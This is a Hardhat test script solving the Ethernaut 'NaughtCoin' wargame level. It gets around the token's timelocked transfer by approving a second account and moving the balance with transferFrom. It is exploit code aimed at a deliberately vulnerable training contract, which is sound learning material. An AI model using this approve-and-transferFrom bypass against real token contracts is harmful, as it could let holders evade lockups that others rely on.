import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Update to match the target contract
  const challengeFactory = await ethers.getContractFactory(`NaughtCoin`);
  // The below address comes from Ethernaut deployed on Rinkeby
  // Go to https://ethernaut.openzeppelin.com/, select a Level, grab address
  // from the URL
  const challengeAddress = await createChallenge(
    `0x096bb5e93a204BfD701502EB6EF266a950217218`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  // Update this to match your attack contract
  //const attackerFactory = await ethers.getContractFactory(`CoinFlipAttacker`);
  //attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
    // 1. Authorize a secondary account to withdraw funds
    // 2. Transfer funds from secondary account to timelocked account

    const balance = await challenge.balanceOf(accounts[0].getAddress())
    //console.log(`Initial balance:\t${balance}`);
    await challenge.approve(
        accounts[1].getAddress(),
        balance
    );

    const allowance = 
        await challenge.allowance(
            accounts[0].getAddress(),
            accounts[1].getAddress()
    );
    //console.log(`Allowance:\t\t${allowance}`);
    // Use challenge.connect to execute the contract as the secondary account
    // instead of the timelocked account
    await challenge.connect(accounts[1]).transferFrom(
        accounts[0].getAddress(),
        accounts[1].getAddress(),
        balance
    );
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
